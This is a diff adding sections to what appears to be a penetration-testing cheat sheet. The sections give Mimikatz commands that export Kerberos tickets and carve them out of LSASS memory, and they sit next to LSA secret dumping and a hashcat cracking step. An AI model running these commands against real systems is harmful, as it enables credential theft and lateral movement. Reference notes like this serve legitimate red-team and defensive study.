@@ -33,6 +33,31 @@ privilege::debug
 lsadump::lsa /patch
 ```
 
+## Mimikatz .kirbi extraction&#x20;
+
+```
+mimikatz # privilege::debug
+mimikatz # token::elevate
+mimikatz # standard::base64 /output:true
+mimikatz # kerberos::list /export
+```
+
+## Carve Tickets out of LSASS Memory
+
+* Mimikatz can carve tickets directly out of LSASS memory&#x20;
+
+```
+mimikatz # privilege::debug
+mimikatz # standard::base64 /output:true
+mimikatz # sekurlsa::tickets /export
+
+Using 'out.txt' for logfile : OK
+
+mimikatz # kerberos::list /export
+--OR--
+sekurlsa::tickets /export
+```
+
 ## Crack with hashcat
 
 ```
